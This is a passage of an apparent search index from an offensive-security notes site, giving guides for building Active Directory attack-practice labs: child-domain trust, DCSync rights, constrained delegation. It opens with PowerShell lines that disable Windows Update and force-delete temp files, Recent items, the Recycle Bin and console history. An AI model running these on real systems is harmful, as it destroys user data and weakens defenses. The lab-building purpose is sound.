monitor-timeout-ac 0 powercfg /Change monitor-timeout-dc 0 powercfg /Change standby-timeout-ac 0 powercfg /Change standby-timeout-dc 0 powercfg /Change hibernate-timeout-ac 0 powercfg /Change hibernate-timeout-dc 0 Write-Host \"[+] Disabling Windows Update\" sc stop WaasMedicSvc sc stop wuauserv sc stop UsoSvc Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\" -Name \"Start\" -Value 4 Write-Host \"[+] Cleaning Up\" Remove-Item -path C:\\Windows\\Temp\\* -Recurse -Force Remove-Item \"C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*\" -Recurse -Force -ErrorAction SilentlyContinue Remove-Item \"C:\\Users\\*\\AppData\\Local\\Temp\\*\" -Recurse -Force -ErrorAction SilentlyContinue Remove-Item \"C:\\`$Recycle.Bin\\*\" -Recurse -Force -ErrorAction SilentlyContinue Remove-Item \"C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\" -Force -ErrorAction SilentlyContinue","title":"2.3) Wrapping Up"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/#3-the-end","text":"Thank you for reading through the guide and I hope things that I\u2019ve provided will be helpful. If you have any questions you can reach out to me on Offensive Security Discord (Discord Tag : Enox#4458) or Twitter (@csenox1)","title":"3) The End"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Child%20Domain%20Lab%20Setup/","text":"Child Domain Lab Setup Preqrequisite: Windows server 2019: https://www.microsoft.com/en-in/evalcenter/evaluate-windows-server-2019 Setup One Domain Controller [ Refer to this guide to learn how to setup a DC https://csenox.github.io/active-directory/2020/10/07/AD-Lab/ ] Setting up DC02 [ Child Domain ] \u21d2 Okay so after setting up our first domain controller ( vDC01 ) in the domain endark.local we will try and ping it from our fresh install of windows server 2019: As we can see we are able to ping the machine. Setting up Static IP and DNS Server \u21d2 Now we will setup static ip and DNS server ( i.e vDC01 ) Installing AD \u21d2 Now we will be installing Active Directory Domain Services and DNS Server Promoting Server to DC \u21d2 Now we will promote this server to a domain controller \u21d2 So we want this to be a child domain we will set the following settings Using the vDC01 administrator credentials: Press Next and Install! \u21d2 After reboot we are presented with the following login: Checking Trusts b/w Parent and Child Domain \u21d2 Now lets head over to vDC01 [ endark.local ] and check the trusts b/w these domains: We see that baby.endark.local is child of endark.local domain! \u21d2 Running Get-ADTrust -Filter * we see that the trust direction is bidirectional which means that members can authenticate from one domain to another when they want to access shared resources. \u21d2 Now our lab is ready to practise Parent Child Domain Trust Abuse [ Domain Admin to Enterprise Admin ]. Author: d4rckh & enox","title":"Child Domain Lab Setup"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Child%20Domain%20Lab%20Setup/#child-domain-lab-setup","text":"","title":"Child Domain Lab Setup"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Child%20Domain%20Lab%20Setup/#preqrequisite","text":"Windows server 2019: https://www.microsoft.com/en-in/evalcenter/evaluate-windows-server-2019 Setup One Domain Controller [ Refer to this guide to learn how to setup a DC https://csenox.github.io/active-directory/2020/10/07/AD-Lab/ ]","title":"Preqrequisite:"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Child%20Domain%20Lab%20Setup/#setting-up-dc02-child-domain","text":"\u21d2 Okay so after setting up our first domain controller ( vDC01 ) in the domain endark.local we will try and ping it from our fresh install of windows server 2019: As we can see we are able to ping the machine.","title":"Setting up DC02 [ Child Domain ]"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Child%20Domain%20Lab%20Setup/#setting-up-static-ip-and-dns-server","text":"\u21d2 Now we will setup static ip and DNS server ( i.e vDC01 )","title":"Setting up Static IP and DNS Server"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Child%20Domain%20Lab%20Setup/#installing-ad","text":"\u21d2 Now we will be installing Active Directory Domain Services and DNS Server","title":"Installing AD"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Child%20Domain%20Lab%20Setup/#promoting-server-to-dc","text":"\u21d2 Now we will promote this server to a domain controller \u21d2 So we want this to be a child domain we will set the following settings Using the vDC01 administrator credentials: Press Next and Install! \u21d2 After reboot we are presented with the following login:","title":"Promoting Server to DC"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Child%20Domain%20Lab%20Setup/#checking-trusts-bw-parent-and-child-domain","text":"\u21d2 Now lets head over to vDC01 [ endark.local ] and check the trusts b/w these domains: We see that baby.endark.local is child of endark.local domain! \u21d2 Running Get-ADTrust -Filter * we see that the trust direction is bidirectional which means that members can authenticate from one domain to another when they want to access shared resources. \u21d2 Now our lab is ready to practise Parent Child Domain Trust Abuse [ Domain Admin to Enterprise Admin ].","title":"Checking Trusts b/w Parent and Child Domain"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Child%20Domain%20Lab%20Setup/#author-d4rckh-enox","text":"","title":"Author: d4rckh &amp; enox"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/","text":"Creating an Active Directory domain Setting up DC Preqrequisite : Windows server 2019 : https://www.microsoft.com/en-in/evalcenter/evaluate-windows-server-2019 Setting up DNS : DNS is an important prerequisite of Active Directory. Without it, Active Directory will not function, or should we say, you can't install or promote a server to a domain controller. Active Directory heavily relies on DNS. So first we will open up our network adapter settings in control panel Next will go to its properties and setup IPv4 with our DNS server address : Thats all we have to do to setup DNS on our Windows Server 2019. Changing Machine Name Settings \u2192 System \u2192 About \u2192 Rename this PC We named it vDC-01 : v - Virtual DC - Domain Controller 01 - First Domain Controller Installing Active Directory First we will go to Manage \u2192 Add Roles and Features Now just follow the screenshots : Promoting Server to Domain Controller \u21d2 So when we startup Server Manager we see the following Alert saying that we need to configure some thing for AD Domain Services to promote it to a DC. So first we will have to create a new forest with whatever root domain name you like. Next we just set DSRM Password We dont need to create DNS delegation. Next we have the option to set our NETBIOS Name Finally we finish and install So now our Domain Controller is ready to be used. When it reboots we get the following login : Adding Users \u21d2 We will go to our windows start menu and go into Windows Administrative Tools and open up Active Directory Users and Computers First we will be creating OU ( Organizational Unit ) for Groups and Users under IN ( India - Country ) OU. Next we moved the groups from Users to the OU we created for Groups : Next we will be creating a user in Users OU We set samname as rkumar which is the username the person will use to login. Next we set password : P@ssw0rd Setting up Client Prerequisites Windows 10 Enterprise : https://www.microsoft.com/en-in/evalcenter/evaluate-windows-10-enterprise Connecting our client to DC01 First lets open up network adapter properties and change the ipv4 settings to use DC01 dns address : 192.168.51.133 Next we will connect to the domain lexi.local : First we open up System Properties Next we will set the Domain to lexi.local Next we just restart our client and we can login as user rkumar ( raj kumar ) on this machine \u21d2 Going back to our DC01 and opening up Active Directory Users and Computers settings and we see that our CLIENT01 machine was sucessfully connected to domain. \u21d2 The lab is now ready and you can practise any attacks you want.","title":"Creating an Active Directory domain"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/#creating-an-active-directory-domain","text":"","title":"Creating an Active Directory domain"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/#setting-up-dc","text":"","title":"Setting up DC"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/#preqrequisite","text":"Windows server 2019 : https://www.microsoft.com/en-in/evalcenter/evaluate-windows-server-2019","title":"Preqrequisite :"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/#setting-up-dns","text":"DNS is an important prerequisite of Active Directory. Without it, Active Directory will not function, or should we say, you can't install or promote a server to a domain controller. Active Directory heavily relies on DNS. So first we will open up our network adapter settings in control panel Next will go to its properties and setup IPv4 with our DNS server address : Thats all we have to do to setup DNS on our Windows Server 2019.","title":"Setting up DNS :"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/#changing-machine-name","text":"Settings \u2192 System \u2192 About \u2192 Rename this PC We named it vDC-01 : v - Virtual DC - Domain Controller 01 - First Domain Controller","title":"Changing Machine Name"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/#installing-active-directory","text":"First we will go to Manage \u2192 Add Roles and Features Now just follow the screenshots :","title":"Installing Active Directory"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/#promoting-server-to-domain-controller","text":"\u21d2 So when we startup Server Manager we see the following Alert saying that we need to configure some thing for AD Domain Services to promote it to a DC. So first we will have to create a new forest with whatever root domain name you like. Next we just set DSRM Password We dont need to create DNS delegation. Next we have the option to set our NETBIOS Name Finally we finish and install So now our Domain Controller is ready to be used. When it reboots we get the following login :","title":"Promoting Server to Domain Controller"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/#adding-users","text":"\u21d2 We will go to our windows start menu and go into Windows Administrative Tools and open up Active Directory Users and Computers First we will be creating OU ( Organizational Unit ) for Groups and Users under IN ( India - Country ) OU. Next we moved the groups from Users to the OU we created for Groups : Next we will be creating a user in Users OU We set samname as rkumar which is the username the person will use to login. Next we set password : P@ssw0rd","title":"Adding Users"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/#setting-up-client","text":"","title":"Setting up Client"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/#prerequisites","text":"Windows 10 Enterprise : https://www.microsoft.com/en-in/evalcenter/evaluate-windows-10-enterprise","title":"Prerequisites"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/#connecting-our-client-to-dc01","text":"First lets open up network adapter properties and change the ipv4 settings to use DC01 dns address : 192.168.51.133 Next we will connect to the domain lexi.local : First we open up System Properties Next we will set the Domain to lexi.local Next we just restart our client and we can login as user rkumar ( raj kumar ) on this machine \u21d2 Going back to our DC01 and opening up Active Directory Users and Computers settings and we see that our CLIENT01 machine was sucessfully connected to domain. \u21d2 The lab is now ready and you can practise any attacks you want.","title":"Connecting our client to DC01"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/DCSync%20Lab%20Setup/","text":"DCSync Lab Setup \u21d2 So for an user to perform DCSync Attack he needs the following permissions The \u201c DS-Replication-Get-Changes \u201d extended right CN: DS-Replication-Get-Changes GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 The \u201c Replicating Directory Changes All \u201d extended right CN: DS-Replication-Get-Changes-All GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 The \u201c Replicating Directory Changes In Filtered Set \u201d extended right (this one isn\u2019t always needed but we can add it just in case) CN: DS-Replication-Get-Changes-In-Filtered-Set GUID: 89e95b76-444d-4c62-991a-0facbeda640c \u21d2 So we created an user named Joe Mama ( j.mama ) and then gave the permissions required to perform DCSync Attack References https://adsecurity.org/?p=1729","title":"DCSync Lab Setup"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/DCSync%20Lab%20Setup/#dcsync-lab-setup","text":"\u21d2 So for an user to perform DCSync Attack he needs the following permissions The \u201c DS-Replication-Get-Changes \u201d extended right CN: DS-Replication-Get-Changes GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 The \u201c Replicating Directory Changes All \u201d extended right CN: DS-Replication-Get-Changes-All GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 The \u201c Replicating Directory Changes In Filtered Set \u201d extended right (this one isn\u2019t always needed but we can add it just in case) CN: DS-Replication-Get-Changes-In-Filtered-Set GUID: 89e95b76-444d-4c62-991a-0facbeda640c \u21d2 So we created an user named Joe Mama ( j.mama ) and then gave the permissions required to perform DCSync Attack References https://adsecurity.org/?p=1729","title":"DCSync Lab Setup"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Kerberos%20Constrained%20Delegation%20Lab%20Creation/","text":"Kerberos Constrained Delegation Lab Creation Creating a lab for practicing Constrained Kerberos Delegation is very easy. Creating the User First you will create a new user in your Domain, you can use an existing user also. Give it a username and a password. Adding the SPN To allow the user to do kerberos delegation, it has to have an SPN first. We are going to add a dummy one: constrained/ Enabling Delegation for CIFs and LDAP on our DC for our User Go to the Delegation tab in the User properties and on Add Next click Users and Computers and Choose your DC and click OK Select CIFs and LDAP on DC It should look like this in the end: Don't forget to set Trust this user for delegation to specified services only and then Use any authentication protocol also make sure the services are as following, you can now go try the attack!","title":"Kerberos Constrained Delegation Lab Creation"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Kerberos%20Constrained%20Delegation%20Lab%20Creation/#kerberos-constrained-delegation-lab-creation","text":"Creating a lab for practicing Constrained Kerberos Delegation is very easy.","title":"Kerberos Constrained Delegation Lab Creation"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Kerberos%20Constrained%20Delegation%20Lab%20Creation/#creating-the-user","text":"First you will create a new user in your Domain, you can use an existing user also. Give it a username and a password.","title":"Creating the User"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Kerberos%20Constrained%20Delegation%20Lab%20Creation/#adding-the-spn","text":"To allow the user to do kerberos delegation, it has to have an SPN first. We are going to add a dummy one: constrained/","title":"Adding the SPN"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Kerberos%20Constrained%20Delegation%20Lab%20Creation/#enabling-delegation-for-cifs-and-ldap-on-our-dc-for-our-user","text":"Go to the Delegation tab in the User properties and on Add Next click Users and Computers and Choose your DC and click OK Select CIFs and LDAP on DC It should look like this in the end: Don't forget to set Trust this user for delegation to specified services only and then Use any authentication protocol also make sure the services are as following, you can now go try the attack!","title":"Enabling Delegation for CIFs and LDAP on our DC for our User"}]}